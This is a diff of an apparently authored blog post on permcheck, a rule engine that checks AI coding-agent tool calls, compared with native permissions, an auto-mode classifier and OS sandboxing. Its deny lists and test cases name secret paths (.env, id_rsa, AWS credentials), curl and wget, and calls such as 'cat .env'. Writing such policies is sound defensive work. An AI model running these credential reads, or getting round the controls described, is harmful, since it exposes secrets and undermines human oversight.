-      </table>
-    </div>
-
-    <div class="measure">
-      <p>Pick the column you would defend at a design review. Deny sends the engineer to a terminal, so the agent loses the task and the audit trail leaves the tool. Allow is what that policy becomes after the third complaint. Unlisted bills the operator seven prompts. permcheck runs the inspection commands silently and denies the rest. One denial, <code>aws s3 ls</code>, is a coverage gap rather than a dangerous call: <code>aws * list-*</code> misses the <code>ls</code> alias, and <code>Bash(aws s3 ls:*)</code> fixes it.</p>
-
-      <p>Every verdict is also an exit code, so a loop of two-line checks against the <a href="blog-assets/enterprise-policy.json" download="enterprise-policy.json">incident policy</a> produced every row above. Assert in CLI mode, since the hook always exits <code>0</code> and carries its verdict in <code>permissionDecision</code>. Assert the code you want, never the one you do not: a corrupt rules file exits <code>3</code>, which <code>-ne 2</code> would pass as safe.</p>
-
-      <div class="callout warn">
-        <p class="label">Keep the floor separate from the exceptions</p>
-        <p>A carve-out resolves only among rules inside the permcheck policy, so both the broad deny and its narrow exception must live there. <a href="https://code.claude.com/docs/en/permissions#extend-permissions-with-hooks" rel="noopener noreferrer" target="_blank">Native precedence stays terminal</a>: a permcheck <code>allow</code> never opens a native <code>deny</code>. Managed settings hold what is never permitted, a floor no file developers edit should negotiate.</p>
-      </div>
-
-      <h3 id="auto-mode">Auto mode judges intent; permcheck enforces an envelope</h3>
-      <p>Anthropic ships a different answer to the same prompt fatigue: in <a href="https://code.claude.com/docs/en/permission-modes#eliminate-prompts-with-auto-mode" rel="noopener noreferrer" target="_blank">auto mode</a>, a classifier asks whether an unresolved action is justified by the current request, trust boundary, and conversation. Administrators describe that boundary with <a href="https://code.claude.com/docs/en/auto-mode-config" rel="noopener noreferrer" target="_blank"><code>environment</code>, <code>allow</code>, <code>soft_deny</code>, and <code>hard_deny</code></a> entries. Native permission rules still resolve first.</p>
-
-      <div class="callout">
-        <p class="label">Two different questions</p>
-        <p>Auto mode asks, <em>“Is this action appropriate here?”</em> permcheck asks, <em>“Is this exact call inside the organization's pre-approved match-set?”</em> The classifier is wider: it interprets user intent, unfamiliar commands, generated behavior, and external infrastructure. permcheck is stricter: user wording and model judgment never turn a denied operation into an allowed one.</p>
-      </div>
-
-      <div class="table-wrap" role="region" aria-label="Enterprise control layers compared, scrollable" tabindex="0">
+      <div class="table-wrap" role="region" aria-label="Permission controls compared, scrollable" tabindex="0">
         <table class="control-matrix">
-          <caption>Each layer earns its place by answering a different control question.</caption>
+          <caption>Use each control for the decision it can make reliably.</caption>
           <thead>
             <tr>
               <th scope="col">Control</th>
-              <th scope="col">Primary value</th>
+              <th scope="col">Use it for</th>
               <th scope="col">Context-aware</th>
-              <th scope="col">Repeatable verdict</th>
-              <th scope="col">Narrow carve-out</th>
-              <th scope="col">Hard boundary</th>
+              <th scope="col">Deterministic rule result</th>
+              <th scope="col">Execution boundary</th>
             </tr>
           </thead>
           <tbody>
             <tr>
               <td>Native permissions</td>
-              <td>Vendor-enforced allow, ask, and deny</td>
+              <td>Vendor-enforced allow, ask, and deny rules</td>
               <td>No</td>
               <td>Yes</td>
-              <td>No</td>
               <td>No</td>
             </tr>
             <tr>
               <td>Auto mode</td>
-              <td>Intent and environmental judgment</td>
+              <td>Reviewing whether an action fits the current request and environment</td>
               <td>Yes</td>
               <td>No</td>
-              <td>Semantic</td>
-              <td>No</td>
-            </tr>
-            <tr>
-              <td>Generic <code>PreToolUse</code> hook</td>
-              <td>Custom enforcement point</td>
-              <td>Implementation-dependent</td>
-              <td>Implementation-dependent</td>
-              <td>Implementation-dependent</td>
               <td>No</td>
             </tr>
             <tr>
               <td>permcheck</td>
-              <td>Versioned, deterministic exception policy</td>
+              <td>Versioned exceptions and policy tests</td>
               <td>No</td>
-              <td>Yes</td>
-              <td>Strict-subset proof</td>
+              <td>Yes, for the same evaluated inputs and engine version</td>
               <td>No</td>
             </tr>
             <tr>
-              <td>OS and network sandbox</td>
-              <td>Filesystem and egress containment</td>
+              <td>OS and network controls</td>
+              <td>Filesystem, process, and egress containment</td>
               <td>No</td>
-              <td>Yes</td>
-              <td>By environment configuration</td>
+              <td>Configuration-dependent</td>
               <td>Yes</td>
             </tr>
           </tbody>
         </table>
       </div>
 
-      <p>A hook by itself is not the differentiator; Claude Code already exposes that extension point. permcheck packages it as a policy engine with containment-based exceptions, linting, deterministic exit codes, compound-command analysis, file-access cross-checks, and a CLI surface for regression tests.</p>
+      <p><a href="https://code.claude.com/docs/en/permission-modes" rel="noopener noreferrer" target="_blank">Auto mode</a> uses a classifier to consider the request, conversation, and configured environment. It can review commands the rule author did not anticipate, but its answer depends on context. Each check is a model round trip.</p>
 
-      <details class="recipe-details">
-        <summary>Compare the classifier with rule evaluation</summary>
-        <p>The classifier blocks what escalates beyond your request, targets unrecognized infrastructure, or looks driven by hostile content. It removes far more prompts than a rule file does, because no one has to list every call in advance. Its natural-language policy also expresses soft and hard boundaries. The classifier still interprets those boundaries from context.</p>
+      <p>permcheck evaluates the tool call against a fixed policy without interpreting the request. A check takes about 1.7 ms and spends no tokens (the author’s median of 50 warm runs on an M3 Max). Teams can review decisions such as “allow a tool’s inspection commands but deny its mutations” as code and test them in CI.</p>
 
-        <div class="table-wrap" role="region" aria-label="Classifier review compared with rule evaluation, scrollable" tabindex="0">
-          <table>
-            <caption>Six properties that decide which layer owns a decision.</caption>
-            <thead>
-              <tr><th scope="col">Property</th><th scope="col">Classifier review</th><th scope="col">Rule evaluation</th></tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td>Question answered</td>
-                <td>Does this action fit the request and environment?</td>
-                <td>Does this call match the reviewed policy?</td>
-              </tr>
-              <tr>
-                <td>Same input, same verdict</td>
-                <td>Not guaranteed; context shapes the judgment</td>
-                <td>Guaranteed; the same call and file give the same exit code</td>
-              </tr>
-              <tr>
-                <td>User intent</td>
-                <td>Clears a <code>soft_deny</code> when the exact action is authorized</td>
-                <td>Does not change the verdict</td>
-              </tr>
-              <tr>
-                <td>Cost per classified shell command</td>
-                <td>A model round trip; checks count toward usage on Enterprise and API/provider-backed accounts</td>
-                <td>About 1.7 ms, no tokens (author's median of 50 warm runs on an M3 Max)</td>
-              </tr>
-              <tr>
-                <td>Explanation on a block</td>
-                <td>Usually the fixed text <code>Blocked by classifier</code></td>
-                <td>The rule that matched</td>
-              </tr>
-              <tr>
-                <td>Availability</td>
-                <td>All plans, subject to supported models and providers; an administrator setting turns it off</td>
-                <td>Any model, any provider, any mode</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <p>Three consecutive classifier blocks, or twenty total, pause auto mode in an interactive session. A non-interactive <code>-p</code> run has no prompt to fall back to: the blocked action does not run, but Claude keeps working. Auto mode drops broad allow rules such as <code>Bash(*)</code> while narrow ones such as <code>Bash(npm test)</code> carry over. Set <code>autoMode.classifyAllShell</code> when every shell command should reach the classifier despite those narrow allows.</p>
-      </details>
-
-      <p>Where permcheck outshines auto mode is settled policy. “Allow AWS inspection but never mutation” should not change because a user rephrased the request, the transcript was compacted, or the classifier model changed. A permcheck policy proves the read-only exception is contained by the AWS deny, names the matching rule, and asserts the same exit code in CI. Auto mode is stronger where the right answer depends on meaning: whether an unfamiliar command exceeds the request, whether a target is external, or whether a generated script crosses a trust boundary.</p>
-
-      <p>The division is practical, not a rivalry. Send judgment calls to the classifier; encode the decisions your organization already made, the ones belonging in a reviewed file and in CI, as deterministic rules. Keep absolute prohibitions in managed native settings. Where you need a guarantee neither policy layer provides, reach past both to the OS sandbox and network boundary.</p>
-    </div>
-
-    <section id="install" class="measure">
-      <p class="section-kicker">The quick start</p>
-      <h2>Install and verify</h2>
-      <p>Prebuilt executables ship through the Claude Code plugin and Homebrew. The plugin covers macOS, Linux, and Windows, and registers its hook without hand-editing <code>settings.json</code>:</p>
-
-      <div class="callout">
-        <p class="label">Trust before install</p>
-        <p>The matcher source is public under Apache-2.0 in the <a href="https://github.com/saleem-mirza/permcheck" rel="noopener noreferrer" target="_blank">permcheck repository</a>, so the rules above are auditable against the code that enforces them, and <code>cargo build --release</code> produces a binary you control end to end. The build is not bit-for-bit reproducible: each release publishes <code>SHA256SUMS</code> covering the binaries and the plugin bundle, which pins the artifact you installed but does not tie it to a source tree. To check behavior rather than provenance, run the decision cases below against the installed artifact.</p>
-      </div>
-
-      <pre><code><span class="comment"># Claude Code plugin</span>
-/plugin marketplace add saleem-mirza/marketplace
-/plugin install permcheck@zethian
-
-<span class="comment"># Standalone CLI on macOS</span>
-brew install saleem-mirza/tap/permcheck</code></pre>
-
-      <p>Its bundled policy denies known dangerous calls and prompts on the rest. To check the install against the teaching policy:</p>
-
-      <pre><code>permcheck Bash "cat .env" --rules sample-policy.json
-<span class="comment"># exit 2 · Bash reader cross-check hits the Read deny</span>
-
-permcheck Bash "python3 -c 'import os'" --rules sample-policy.json
-<span class="comment"># exit 2 · inline-code deny holds under the broad Python allow</span>
-
-permcheck Bash "kubectl get pods --namespace dev" --rules sample-policy.json
-<span class="comment"># exit 0 · the namespace allow matches and no deny does</span></code></pre>
-
-      <p>The plugin's bundled policy, not the teaching file above, protects the canonical <code>.claude</code> files, their <code>.local</code> variants, <code>managed-settings.json</code>, and the project-local <code>.permcheck/**</code> override. It accepts any absolute path through <code>$PERMCHECK_RULES</code>, so treat the hook environment as trusted operator configuration.</p>
+      <p>Restrictions that developers must never override belong in managed Claude Code settings, where no permcheck rule can reach them. Use OS and network controls for requirements that must hold after a process starts.</p>
     </section>
 
-    <section id="recipes" class="wide-section">
+    <figure>
+      <img src="blog-assets/diagram-6-stack.png" alt="A control stack showing contextual review, permcheck, native Claude Code permissions, and OS sandbox and managed settings.">
+      <figcaption>Permission checks reduce risk before execution. The operating system and network still provide the enforceable boundary.</figcaption>
+    </figure>
+
+    <section id="cost" class="wide-section">
       <div class="measure">
-        <p class="section-kicker">The starting points</p>
-        <h2>Four focused starter policies</h2>
-        <p>Merge a fragment into the matching tiers of your policy, then test the call you want and the nearest one you do not. Starting points, not security boundaries.</p>
+        <p class="section-kicker">Comparison</p>
+        <h2>Four ways to write the same policy</h2>
+        <p>Each column below is the same policy written a different way, run against one incident session. Every cell is an exit code from the CLI against the downloadable <a href="blog-assets/enterprise-policy.json" download="enterprise-policy.json">incident policy</a>.</p>
       </div>
 
-      <details class="recipe-details">
-        <summary>Show the four policy fragments</summary>
-        <div class="recipes">
-        <article class="card recipe">
-          <h3>1. Allow selected AWS reads</h3>
-          <p>Permit <code>describe-*</code> and <code>list-*</code> while denying other AWS commands.</p>
-          <pre><code><span class="key">"allow"</span>: [
-  <span class="string">"Bash(aws * describe-*)"</span>,
-  <span class="string">"Bash(aws * list-*)"</span>
-],
-<span class="key">"deny"</span>: [
-  <span class="string">"Bash(aws:*)"</span>
-]</code></pre>
-          <p><code>aws ec2 describe-instances</code> allows; <code>aws ec2 terminate-instances</code> denies.</p>
-          <p class="coverage"><strong>Coverage:</strong> Operation-name patterns only. Review the services and flags your environment uses.</p>
-        </article>
-        <article class="card recipe">
-          <h3>2. Block common secret paths</h3>
-          <p>Deny direct reads and Grep calls. The Read rules also feed the Bash-reader cross-check.</p>
-          <pre><code><span class="key">"deny"</span>: [
-  <span class="string">"Read(//**/.env*)"</span>,
-  <span class="string">"Read(//**/id_rsa*)"</span>,
-  <span class="string">"Read(//**/.aws/credentials)"</span>,
-  <span class="string">"Grep(//**/.env*)"</span>,
-  <span class="string">"Grep(//**/id_rsa*)"</span>,
-  <span class="string">"Grep(//**/.aws/credentials)"</span>
-]</code></pre>
-          <p><code>Read ~/.ssh/id_rsa</code> and <code>Bash "cat .env"</code> deny.</p>
-          <p class="coverage"><strong>Coverage:</strong> Named paths and recognized readers. Other tools and runtime-built paths need explicit rules or filesystem isolation.</p>
-        </article>
-
-        <article class="card recipe">
-          <h3>3. Restrict common HTTP paths</h3>
-          <p>Block WebSearch, shell HTTP clients, and general WebFetch, allowing one internal host.</p>
-          <pre><code><span class="key">"allow"</span>: [
-  <span class="string">"WebFetch(domain:docs.internal.co)"</span>
-],
-<span class="key">"deny"</span>: [
-  <span class="string">"WebFetch"</span>,
-  <span class="string">"WebSearch"</span>,
-  <span class="string">"Bash(curl:*)"</span>,
-  <span class="string">"Bash(wget:*)"</span>
-]</code></pre>
-          <p><code>WebFetch https://docs.internal.co/x</code> allows; other WebFetch hosts deny.</p>
-          <p class="coverage"><strong>Coverage:</strong> These named routes only. Enforce no-egress in the network sandbox or firewall.</p>
-        </article>
-
-        <article class="card recipe">
-          <h3>4. Run a headless CI allow-list</h3>
-          <p>Deny every unnamed call so the pipeline fails instead of waiting for approval.</p>
-          <pre><code><span class="key">"defaultMode"</span>: <span class="string">"deny"</span>,
-<span class="key">"allow"</span>: [
-  <span class="string">"Bash(cargo test:*)"</span>,
-  <span class="string">"Bash(cargo build:*)"</span>,
-  <span class="string">"Bash(git status:*)"</span>
-]</code></pre>
-          <p><code>cargo test --all</code> allows; <code>cargo publish</code> denies.</p>
-          <p class="coverage"><strong>Coverage:</strong> Only the listed commands. Grow the allow-list from observed CI needs.</p>
-        </article>
-
-        </div>
-      </details>
-
-      <div class="measure">
-        <p>Recipe 4 pairs with <a href="https://code.claude.com/docs/en/permission-modes" rel="noopener noreferrer" target="_blank"><code>dontAsk</code> mode</a>, which never waits for an answer nobody is there to give. It changes what two of the three verdicts mean.</p>
-      </div>
-
-      <div class="table-wrap" role="region" aria-label="permcheck verdicts under a normal session and under dontAsk" tabindex="0">
-        <table class="compact">
-          <caption>What each permcheck verdict does once the session stops prompting.</caption>
+      <div class="table-wrap" role="region" aria-label="Seven incident commands under four policy shapes, scrollable" tabindex="0">
+        <table>
+          <caption>Seven commands from one incident session, under each native policy shape and under permcheck.</caption>
           <thead>
-            <tr><th scope="col">Verdict</th><th scope="col">Normal session</th><th scope="col">Under <code>dontAsk</code></th></tr>
+            <tr>
+              <th scope="col">Incident session command</th>
+              <th scope="col">Deny <code>kubectl</code>, <code>aws</code>, <code>terraform</code></th>
+              <th scope="col">Allow them</th>
+              <th scope="col">Leave unlisted (<code>defaultMode: ask</code>)</th>
+              <th scope="col">permcheck carve-outs</th>
+            </tr>
           </thead>
           <tbody>
-            <tr><td><code>allow</code></td><td>runs</td><td>runs</td></tr>
-            <tr><td><code>ask</code></td><td>prompts</td><td><strong>denied</strong>, never prompted</td></tr>
-            <tr><td><code>deny</code></td><td>blocked</td><td>blocked, including Claude Code's built-in read-only commands</td></tr>
+            <tr><td><code>kubectl get pods --namespace prod</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict allow">Allow</span></td></tr>
+            <tr><td><code>aws ec2 describe-instances</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict allow">Allow</span></td></tr>
+            <tr><td><code>terraform plan -out tf.plan</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict allow">Allow</span></td></tr>
+            <tr><td><code>aws s3 ls s3://audit-logs</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict deny">Deny</span></td></tr>
+            <tr><td><code>terraform apply tf.plan</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict deny">Deny</span></td></tr>
+            <tr><td><code>kubectl delete pod api-7f9 --namespace prod</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict deny">Deny</span></td></tr>
+            <tr><td><code>kubectl get secret db-creds --namespace prod</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict deny">Deny</span></td></tr>
+            <tr><td><strong>Totals</strong></td><td><strong>0 allow · 7 deny</strong></td><td><strong>7 allow · 0 deny</strong></td><td><strong>7 prompts</strong></td><td><strong>3 allow · 4 deny</strong></td></tr>
           </tbody>
         </table>
       </div>
 
       <div class="measure">
-        <p>So <code>ask</code> becomes a second deny list, and <code>defaultMode: "ask"</code> behaves exactly like <code>deny</code>. Write <code>deny</code> and mean it, so the file states its own intent instead of borrowing it from a launch flag.</p>
+        <p>Denying the three tools sends the engineer to a terminal outside the agent. Allowing them removes the restriction the policy existed for. Leaving them unlisted costs the operator seven prompts. The exceptions run the three inspection commands and deny the rest.</p>
 
-        <p>The deny row runs the other direction, and it is why a hook reaches further than a rule file: <code>cat</code> and <code>grep</code> sit in Claude Code's non-configurable read-only set, yet a PreToolUse hook runs first, so a rule denying <code>cat .env</code> holds.</p>
-
-        <p>One name collides. Both products keep a <code>defaultMode</code> under <code>permissions</code>: permcheck's is the fall-back for an unmatched call, while Claude Code's names the session mode. Paste <code>dontAsk</code> into a permcheck policy and it resolves to <code>deny</code>, with a lint warning.</p>
+        <p>One of those denials, <code>aws s3 ls s3://audit-logs</code>, is a coverage gap rather than a dangerous call: <code>aws * list-*</code> doesn’t match the <code>ls</code> alias, and <code>Bash(aws s3 ls:*)</code> fixes it.</p>
       </div>
     </section>
 
+    <section id="test" class="measure">
+      <p class="section-kicker">Verification</p>
+      <h2>Test the policy before using it</h2>
+      <p>Use permcheck’s standalone CLI to check a rule file. These examples run against the downloadable <a href="blog-assets/sample-policy.json" download="sample-policy.json">sample policy</a>:</p>
+
+      <pre><code><span class="comment"># macOS installation</span>
+brew install saleem-mirza/tap/permcheck
+
+permcheck Bash "aws ec2 describe-instances" --rules sample-policy.json
+<span class="comment"># exit 0 · allow</span>
+
+permcheck Bash "git push origin main" --rules sample-policy.json
+<span class="comment"># exit 1 · ask</span>
+
+permcheck Bash "cat .env" --rules sample-policy.json
+<span class="comment"># exit 2 · Read deny reached through a recognized Bash reader</span></code></pre>
+
+      <p><a href="https://github.com/saleem-mirza/permcheck/blob/main/scripts/blog_examples_test.py" rel="noopener noreferrer" target="_blank"><code>scripts/blog_examples_test.py</code></a> regression-tests the examples in this article. Assert the expected exit code: invalid rules exit <code>3</code>, so a test that checks only for “not deny” can accept a broken policy.</p>
+
+      <p>The Claude Code plugin supports macOS, Linux, and Windows, and registers the <code>PreToolUse</code> hook. The <a href="https://github.com/saleem-mirza/permcheck" rel="noopener noreferrer" target="_blank">permcheck repository</a> contains installation instructions and the current security model.</p>
+    </section>
+
     <section id="takeaway" class="closing measure">
-      <p class="section-kicker">The takeaway</p>
-      <h2>Precision is useful when its boundary is explicit</h2>
-      <p>“Deny always wins” is safe, but too coarse for a bounded exception. permcheck adds a conservative carve-out: an exception crosses a deny only when containment is proven. Shell decomposition closes common side doors; the OS sandbox still owns the containment no hook provides.</p>
-      <p>Auto mode is the better judge when the answer depends on context; permcheck is the better policy engine when the answer must not. Put absolute prohibitions below both, in managed permissions and the execution environment.</p>
-      <p>Where does your agent policy need a narrow exception, and which layer should provide the real boundary? <a href="https://www.linkedin.com/posts/saleem-mirza_when-deny-doesnt-win-share-7490953417008496640-pUVk/" rel="noopener noreferrer" target="_blank">Join the discussion on LinkedIn</a> with the restriction, the exception, and the verdict you expect.</p>
+      <p class="section-kicker">Conclusion</p>
+      <h2>Use narrow exceptions for decisions you can test</h2>
+      <p>Use permcheck for narrow exceptions that should produce the same result in every policy test. Keep absolute restrictions in managed native settings, and rely on OS and network isolation for controls that must hold after execution starts.</p>
+
+      <p>Download the <a href="blog-assets/sample-policy.json" download="sample-policy.json">sample policy</a>, run the three checks above, and add a regression test for every exception your team intends to permit.</p>
+
+      <p>If your policy hits a case this analysis doesn’t cover (a file tool the cross-check doesn’t follow, a shell it doesn’t parse), <a href="https://github.com/saleem-mirza/permcheck/issues" rel="noopener noreferrer" target="_blank">open an issue</a> with the command and the rule you expected to apply.</p>
+
+      <p>If you’d rather compare notes, the <a href="https://www.linkedin.com/posts/saleem-mirza_when-deny-doesnt-win-share-7490953417008496640-pUVk/" rel="noopener noreferrer" target="_blank">discussion thread on LinkedIn</a> is open.</p>
     </section>
   </article>
 
